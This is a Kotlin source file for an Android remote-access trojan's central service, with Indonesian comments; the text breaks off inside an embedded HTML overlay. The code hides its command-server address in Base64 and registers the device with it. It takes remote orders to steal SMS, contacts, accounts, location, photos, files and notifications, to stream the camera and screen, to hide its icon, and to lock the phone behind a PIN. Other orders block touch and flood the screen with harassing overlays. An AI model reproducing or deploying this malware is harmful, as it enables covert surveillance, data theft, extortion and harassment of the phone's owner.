package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.WallpaperManager
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.database.Cursor
import android.location.Address
import android.location.Geocoder
import android.location.LocationManager
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.concurrent.Executors
import android.media.AudioManager
import android.view.KeyEvent
import android.os.SystemClock
import org.webrtc.Camera2Capturer

class DeviceService : Service(), LifecycleOwner {

    companion object {
    const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
    const val EXTRA_COMMAND        = "command"
    const val EXTRA_VALUE          = "value"
    const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
    const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
    const val EXTRA_STATUS_JSON    = "statusJson"
    const val ACTION_SEND_FRAME    = "com.sync.xxx.SEND_FRAME"
    const val EXTRA_FRAME_B64      = "frameB64"
    const val ACTION_SCREEN_RESULT = "com.sync.xxx.SCREEN_RESULT"
    const val EXTRA_RESULT_CODE    = "resultCode"
    const val EXTRA_RESULT_DATA    = "resultData"

    val SERVER_URL: String get() = String(android.util.Base64.decode(
        "aHR0cDovL2FudGkubW9rYXQubWlyenByaXZhdGUubXkuaWQ6MjI0NA==",
        android.util.Base64.DEFAULT
    )).trim()

    const val CHANNEL_ID = "sync_xxx"
    const val NOTIF_ID   = 1
    var lastPendingChat: String = ""
    var lastPendingChatTime: Long = 0L   
    const val PREFS_LOCK      = "rat_lock_state"
    const val KEY_LOCK_ACTIVE = "lock_active"
    const val KEY_LOCK_PIN    = "lock_pin"
    const val KEY_LOCK_TITLE  = "lock_title"
    const val KEY_LOCK_MODE   = "lock_mode"  
    const val KEY_LOCK_CUSTOM = "lock_custom_html"
}

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    var lockPin: String = ""
    var lockTitle: String = ""

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 33L

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false
    
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var screenStreaming = false
    private var lastScreenFrameTime = 0L
    private val SCREEN_FRAME_INTERVAL = 33L
    private var screenHandler: Handler? = null
    private var screenRunnable: Runnable? = null
    private var savedProjectionResultCode: Int = -1
    private var savedProjectionData: Intent? = null

    // ── WebRTC ─────────────────────────────────────────────────────────────
    private var webRTCService: WebRTCStreamService? = null


    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_COMMAND -> {
                  val cmd = intent.     getStringExtra(EXTRA_COMMAND) ?: return
    val value = intent.getStringExtra(EXTRA_VALUE) ?: ""
    handleCommand(cmd, value)
}
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                ACTION_SCREEN_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                    android.util.Log.d("DeviceService", "ACTION_SCREEN_RESULT: resultCode=$resultCode")
                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        intent.getParcelableExtra(EXTRA_RESULT_DATA, android.content.Intent::class.java)
                    else
                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    if (resultCode != android.app.Activity.RESULT_OK || data == null) {
                        android.util.Log.w("DeviceService", "Screen capture denied or data null")
                        emitStatus(JSONObject().apply { put("screenActive", false) })
                        return
                    }
                    savedProjectionResultCode = resultCode
                    savedProjectionData = data
                    startScreenCapture(resultCode, data)
                }
                "com.sync.xxx.NEW_NOTIF" -> {
                    val payloadStr = intent.getStringExtra("payload") ?: return
                    try {
                        val payload = JSONObject(payloadStr)
                        storeNotif(payload)
                        if (socket?.connected() == true) {
                            socket?.emit("device:notif", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("notif", payload)
                            })
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasLocation = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCamera = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED

            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (hasLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

            startForeground(NOTIF_ID, buildNotification(), serviceType)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        deviceId = android.provider.Settings.Secure.getString(
    contentResolver,
    android.provider.Settings.Secure.ANDROID_ID
).takeIf { !it.isNullOrBlank() } ?: Build.ID
        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model  = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
    addAction(ACTION_CONNECT)
    addAction(ACTION_SEND_STATUS)
    addAction(ACTION_SCREEN_RESULT)
    addAction("com.sync.xxx.NEW_NOTIF")
    addAction(ACTION_COMMAND)
         }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        restoreLockStateIfNeeded()

        // Init WebRTC service
        webRTCService = WebRTCStreamService(
            context    = this,
            deviceId   = deviceId,
            onEmitSignal = { event, data ->
                if (socket?.connected() == true) socket?.emit(event, data)
            }
        )
        webRTCService?.initialize()

        Thread { connectSocket() }.start()
    }

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = plugged != 0

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("battery", batteryPct)
                    put("charging", isCharging)
                    put("sdkVersion", Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid", readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")
                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            // ── WebRTC Signaling ─────────────────────────────────────────
            // Browser mengirim answer setelah menerima offer dari Android
            socket?.on("webrtc:answer") { args ->
                val data = args.getOrNull(0) as? org.json.JSONObject ?: return@on
                val toDevice = data.optString("deviceId")
                if (toDevice != deviceId) return@on
                val streamType = data.optString("streamType", "camera")
                val sdp        = data.optString("sdp", "")
                if (sdp.isNotBlank()) {
                    webRTCService?.handleWebRtcAnswer(streamType, sdp)
                }
            }

            // Browser mengirim ICE candidate ke Android
            socket?.on("webrtc:ice_from_browser") { args ->
                val data = args.getOrNull(0) as? org.json.JSONObject ?: return@on
                val toDevice = data.optString("deviceId")
                if (toDevice != deviceId) return@on
                val streamType    = data.optString("streamType", "camera")
                val sdpMid        = data.optString("sdpMid", "")
                val sdpMLineIndex = data.optInt("sdpMLineIndex", 0)
                val candidate     = data.optString("candidate", "")
                if (candidate.isNotBlank()) {
                    webRTCService?.handleIceCandidate(streamType, sdpMid, sdpMLineIndex, candidate)
                }
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

    private fun handleCommand(cmd: String, value: String) {
    when (cmd) {
        "lockV3"           -> lockV3(value)
        "chatFromTarget"   -> sendChatToAdmin(value)
        "chatToTarget"     -> deliverChatToTarget(value)
        "flashlight"       -> setFlashlight(value == "true")
        "senter"           -> setSenter(value == "true")
        "flashInterval"    -> startFlashInterval(value)
        "flashIntervalStop"-> stopFlashInterval()
        "setVolume"        -> setVolumeLevel(value.toIntOrNull()?.coerceIn(0, 100) ?: 50)
        "camera"           -> {
            when (value) {
                "front" -> startCamera("front")
                "back"  -> startCamera("back")
                else    -> stopCamera()
            }
        }
        "screen"           -> {
            when (value) {
                "start" -> requestScreenCapture()
                else    -> stopScreenCapture()
            }
        }
        "lockDevice"       -> lockDevice(value)
        "lockCustom"       -> lockCustom(value)
        "unlockDevice"     -> unlockDevice()
        "changeTheme"      -> changeTheme(value)
        "setWallpaper"     -> setWallpaperFromUrl(value)
        "openUrl"          -> openUrl(value)
        "playAudio"        -> playAudio(value)
        "jumpscareStart"   -> startJumpscare(value)
        "jumpscareStop"    -> stopJumpscare()
        "blockApp"         -> blockApp(value)
        "unblockApp"       -> unblockApp(value)
        "unblockAll"       -> unblockAll()
        "getInstalledApps" -> sendInstalledApps()
        "getSms"           -> sendSms()
        "getNotifs"        -> sendStoredNotifs()
        "getGallery"       -> sendGallery()
        "getLocation"      -> sendLocation()
        "getContacts"      -> sendContacts()
        "getGmail"         -> sendGmailAccounts()
        "getPhone"         -> sendPhoneNumbers()
        "vibrate"          -> vibrateDevice(value)
        "showToast"        -> showToast(value)
        "dialogSpam"       -> startDialogSpam(value)
        "dialogSpamStop"   -> stopDialogSpam()
        "touchBlock"       -> startTouchBlock(value)
        "touchBlockStop"   -> stopTouchBlock()
        "videoOverlay"     -> startVideoOverlay()
        "videoOverlayHide" -> stopVideoOverlay()
        "ttsSpeak"         -> ttsSpeak(value)
        "ttsStop"          -> ttsStop()
        "hideIcon"         -> hideAppIcon(value == "true")
        "muteVolume"       -> setVolumeMute(value == "true")
        "lcdBroken"  -> setLcdBroken(value == "true")
        "jumpscare2Start"  -> startJumpscare2(value)
        "jumpscare2Stop"   -> stopJumpscare2()
        "keyboardSpam"     -> startKeyboardSpam()
        "keyboardSpamStop" -> stopKeyboardSpam()
        "getFiles"         -> sendFileList(value)
        "downloadFile"     -> downloadAndSendFile(value)
    }
}
    
    private fun lockV3(jsonValue: String) {
    try {
        val obj   = org.json.JSONObject(jsonValue)
        val pin   = obj.optString("pin", "")
        val title = obj.optString("title", "Perangkat Terkunci")
        lockPin   = pin
        lockTitle = title

        persistLockState(active = true, pin = pin, title = title, mode = "v3")

        val intent = Intent(this, LockChatActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra(LockOverlayService.EXTRA_PIN,   pin)
            putExtra(LockOverlayService.EXTRA_TITLE, title)
        }
        startActivity(intent)

        startLockFlashBlink()
        emitStatus(JSONObject().apply {
            put("deviceLocked", true)
            put("lockTitle",    title)
            put("lockV3Active", true)
        })
    } catch (e: Exception) {
        Log.e("DeviceService", "lockV3: ${e.message}")
    }
}

    private fun sendChatToAdmin(message: String) {
    if (socket?.connected() != true) return
    socket?.emit("device:chat", org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("from", "target")
        put("message", message)
        put("time", System.currentTimeMillis())
    })
}

private fun deliverChatToTarget(message: String) {
    sendBroadcast(Intent("com.sync.xxx.CHAT_FROM_ADMIN").apply {
        putExtra("message", message)
        setPackage(packageName)
    })
    lastPendingChat = message
    lastPendingChatTime = System.currentTimeMillis()
}

    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }
    
    private var jumpscare2Handler: Handler? = null
   private var jumpscare2Runnable: Runnable? = null
   
   private var jumpscare2View: android.widget.ImageView? = null

private fun startJumpscare2(value: String) {
    stopJumpscare2()
    try {
        val obj      = JSONObject(value)
        val url      = obj.getString("url")
        val duration = obj.optLong("duration", 3000L)

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        )

        val imgView = android.widget.ImageView(this).apply {
            scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
            setBackgroundColor(android.graphics.Color.BLACK)
        }

        jumpscare2View = imgView

        Handler(Looper.getMainLooper()).post {
            wm.addView(imgView, params)
        }

        Thread {
            try {
                var redirectUrl = url
                var bmp: Bitmap? = null
                for (i in 0..4) {
                    val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                    conn.connectTimeout = 12000
                    conn.readTimeout    = 15000
                    conn.instanceFollowRedirects = false
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                    conn.setRequestProperty("Accept", "image/*")
                    conn.connect()
                    val code = conn.responseCode
                    if (code in 300..399) {
                        val loc = conn.getHeaderField("Location")
                        conn.disconnect()
                        if (loc != null) { redirectUrl = loc; continue } else break
                    }
                    val bytes = conn.inputStream.readBytes()
                    conn.disconnect()
                    bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    break
                }
                val finalBmp = bmp
                Handler(Looper.getMainLooper()).post {
                    if (finalBmp != null) imgView.setImageBitmap(finalBmp)
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "jumpscare2 img: ${e.message}")
            }
        }.start()

        jumpscare2Handler = Handler(Looper.getMainLooper())
        jumpscare2Runnable = Runnable {
            try { wm.removeView(imgView) } catch (_: Exception) {}
            jumpscare2View = null
            emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
        }
        jumpscare2Handler?.postDelayed(jumpscare2Runnable!!, duration)

        emitStatus(JSONObject().apply { put("jumpscare2Active", true) })

    } catch (e: Exception) {
        Log.e("DeviceService", "startJumpscare2: ${e.message}")
    }
}

private fun stopJumpscare2() {
    jumpscare2Runnable?.let { jumpscare2Handler?.removeCallbacks(it) }
    jumpscare2Handler  = null
    jumpscare2Runnable = null
    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
    jumpscare2View?.let {
        try { wm.removeView(it) } catch (_: Exception) {}
    }
    jumpscare2View = null
    emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
}

private fun startKeyboardSpam() {
    if (keyspamActive) return
    keyspamActive = true
    keyspamShowState = true

    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                1, 1, type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                x = 0; y = 0
            }

            val editText = android.widget.EditText(this@DeviceService).apply {
                isFocusable = true
                isFocusableInTouchMode = true
                inputType = android.text.InputType.TYPE_CLASS_TEXT
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                setTextColor(android.graphics.Color.TRANSPARENT)
                setCursorVisible(false)
            }

            keyspamOverlayView = editText
            wm.addView(editText, params)
            editText.requestFocus()

            keyspamHandler = Handler(Looper.getMainLooper())
            keyspamRunnable = object : Runnable {
                override fun run() {
                    if (!keyspamActive) return
                    val imm = getSystemService(INPUT_METHOD_SERVICE)
                        as android.view.inputmethod.InputMethodManager

                    if (keyspamShowState) {
                        editText.requestFocus()
                        imm.showSoftInput(
                            editText,
                            android.view.inputmethod.InputMethodManager.SHOW_FORCED
                        )
                    } else {
                        imm.hideSoftInputFromWindow(editText.windowToken, 0)
                    }
                    keyspamShowState = !keyspamShowState
                    keyspamHandler?.postDelayed(this, 200L)
                }
            }
            keyspamHandler?.post(keyspamRunnable!!)

        } catch (e: Exception) {
            Log.e("DeviceService", "startKeyboardSpam: ${e.message}")
            keyspamActive = false
        }
    }

    emitStatus(JSONObject().apply { put("keyboardSpamActive", true) })
}

private fun stopKeyboardSpam() {
    keyspamActive = false
    keyspamRunnable?.let { keyspamHandler?.removeCallbacks(it) }
    keyspamHandler  = null
    keyspamRunnable = null

    Handler(Looper.getMainLooper()).post {
        try {
            keyspamOverlayView?.let { v ->
                val imm = getSystemService(INPUT_METHOD_SERVICE)
                    as android.view.inputmethod.InputMethodManager
                imm.hideSoftInputFromWindow(v.windowToken, 0)
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                try { wm.removeView(v) } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        keyspamOverlayView = null
    }

    emitStatus(JSONObject().apply { put("keyboardSpamActive", false) })
}

private fun injectKey(keyCode: Int) {
    try {
        val im = Class.forName("android.hardware.input.InputManager")
        val getInstance = im.getDeclaredMethod("getInstance")
        getInstance.isAccessible = true
        val instance = getInstance.invoke(null)

        val injectInputEvent = im.getDeclaredMethod(
            "injectInputEvent",
            android.view.InputEvent::class.java,
            Int::class.java
        )
        injectInputEvent.isAccessible = true

        val downTime = SystemClock.uptimeMillis()
        val down = KeyEvent(downTime, downTime, KeyEvent.ACTION_DOWN, keyCode, 0)
        val up   = KeyEvent(downTime, downTime, KeyEvent.ACTION_UP,   keyCode, 0)

        injectInputEvent.invoke(instance, down, 0)
        injectInputEvent.invoke(instance, up,   0)
    } catch (e: Exception) {
        Log.e("DeviceService", "injectKey: ${e.message}")
    }
}


private fun startDialogSpam(value: String) {
    try {
        val text = try { JSONObject(value).optString("text", value) } catch (_: Exception) { value }
        startService(Intent(this, DialogSpamService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(DialogSpamService.ACTION_START).apply {
                putExtra(DialogSpamService.EXTRA_TEXT, text)
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("dialogSpamActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startDialogSpam: ${e.message}")
    }
}

private fun stopDialogSpam() {
    val intent = Intent(DialogSpamService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("dialogSpamActive", false) })
}



private fun ttsSpeak(value: String) {
    try {
        val obj = JSONObject(value)
        val svcIntent = Intent(this, TTSService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svcIntent)
        else startService(svcIntent)
        val intent = Intent(TTSService.ACTION_SPEAK).apply {
            putExtra(TTSService.EXTRA_TEXT,  obj.optString("text", ""))
            putExtra(TTSService.EXTRA_LANG,  obj.optString("lang", "id"))
            putExtra(TTSService.EXTRA_PITCH, obj.optDouble("pitch", 1.0).toFloat())
            putExtra(TTSService.EXTRA_SPEED, obj.optDouble("speed", 1.0).toFloat())
            setPackage(packageName)
        }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("ttsSpeaking", true) })
    } catch (e: Exception) {
        Log.e("DeviceService", "ttsSpeak: ${e.message}")
    }
}

private fun ttsStop() {
    val intent = Intent(TTSService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("ttsSpeaking", false) })
}


private var touchBlockView: android.view.View? = null
private var touchBlockHandler: android.os.Handler? = null
private var touchBlockRunnable: Runnable? = null

private fun startTouchBlock(value: String) {
    try {
        stopTouchBlock()
        val duration = try { org.json.JSONObject(value).optLong("duration", 0L) } catch (_: Exception) { value.toLongOrNull() ?: 0L }

        val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = android.view.WindowManager.LayoutParams(
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            type,
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
            android.graphics.PixelFormat.TRANSLUCENT
        )

        val view = android.view.View(this).apply {
            setBackgroundColor(android.graphics.Color.TRANSPARENT)
            setOnTouchListener { _, _ -> true } // block semua touch
        }

        touchBlockView = view
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            wm.addView(view, params)
        }

        emitStatus(JSONObject().apply { put("touchBlocked", true) })

        // Auto stop kalau duration > 0
        if (duration > 0) {
            touchBlockHandler = android.os.Handler(android.os.Looper.getMainLooper())
            touchBlockRunnable = Runnable { stopTouchBlock() }
            touchBlockHandler?.postDelayed(touchBlockRunnable!!, duration * 1000L)
        }
    } catch (e: Exception) {
        Log.e("DeviceService", "startTouchBlock: ${e.message}")
    }
}

private fun stopTouchBlock() {
    touchBlockRunnable?.let { touchBlockHandler?.removeCallbacks(it) }
    touchBlockHandler  = null
    touchBlockRunnable = null
    val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
    touchBlockView?.let {
        try {
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                wm.removeView(it)
            }
        } catch (_: Exception) {}
    }
    touchBlockView = null
    emitStatus(JSONObject().apply { put("touchBlocked", false) })
}

private var lcdOverlayView: android.webkit.WebView? = null
private val lcdOverlayWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }

private fun setLcdBroken(on: Boolean) {
    if (on) {
        if (lcdOverlayView != null) return // sudah aktif

        val html = getLcdBrokenHtml()

        Handler(Looper.getMainLooper()).post {
            try {
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    // NOT_TOUCHABLE = sentuhan tembus ke bawah, layar tetap interaktif
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.TRANSLUCENT
                )

                val wv = android.webkit.WebView(this@DeviceService).apply {
                    settings.javaScriptEnabled = true
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                    // background transparan biar layar di bawah keliatan
                    loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
                }

                lcdOverlayView = wv
                lcdOverlayWm.addView(wv, params)

                emitStatus(JSONObject().apply { put("lcdBroken", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setLcdBroken on: ${e.message}")
            }
        }
    } else {
        Handler(Looper.getMainLooper()).post {
            lcdOverlayView?.let {
                try { lcdOverlayWm.removeView(it) } catch (_: Exception) {}
            }
            lcdOverlayView = null
            emitStatus(JSONObject().apply { put("lcdBroken", false) })
        }
    }
}

private fun getLcdBrokenHtml(): String {
    // isi dari document index 3 — salin mentah
    return """<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>.</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: transparent;
      width: 100vw; height: 100vh;
      overflow: hidden; position: relative;
    }
    .scanline { position:fixed;left:0;width:100%;pointer-events:none;z-index:9998;mix-blend-mode:screen; }
    .dead-pixel { position:fixed;background:#000;z-index:9997;pointer-events:none; }
    .vline { position:fixed;top:0;height:100%;width:2px;z-index:9996;pointer-events:none;opacity:0.85; }
    .noise { position:fixed;inset:0;z-index:9995;opacity:0.04;pointer-events:none;
      background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
      background-repeat:repeat;background-size:200px 200px; }
    .tint { position:fixed;inset:0;z-index:9990;pointer-events:none;animation:tintFlicker 0.08s infinite; }
    @keyframes tintFlicker {
      0%{background:rgba(0,255,80,0.03)} 25%{background:rgba(140,0,255,0.05)}
      50%{background:rgba(0,255,80,0.02)} 75%{background:rgba(180,0,255,0.04)}
      100%{background:rgba(0,255,80,0.03)}
    }
    .crack-svg{position:fixed;inset:0;width:100%;height:100%;z-index:10000;pointer-events:none;}
  </style>
</head>
<body>
<div class="tint"></div>
<div class="noise"></div>
<svg class="crack-svg" viewBox="0 0 1920 1080" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <filter id="glow-green"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <filter id="glow-purple"><feGaussianBlur stdDeviation="2.5" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
  </defs>
  <g filter="url(#glow-green)" opacity="0.9">
    <line x1="320" y1="210" x2="180" y2="80" stroke="#00ff44" stroke-width="1.5"/>
    <line x1="320" y1="210" x2="420" y2="60" stroke="#00ff44" stroke-width="1"/>
    <line x1="320" y1="210" x2="500" y2="200" stroke="#00ee33" stroke-width="1.2"/>
    <line x1="320" y1="210" x2="220" y2="340" stroke="#00ff44" stroke-width="1"/>
    <line x1="320" y1="210" x2="100" y2="300" stroke="#00cc22" stroke-width="0.8"/>
    <line x1="320" y1="210" x2="60" y2="180" stroke="#00ff44" stroke-width="1.3"/>
    <line x1="320" y1="210" x2="280" y2="420" stroke="#00ff44" stroke-width="0.9"/>
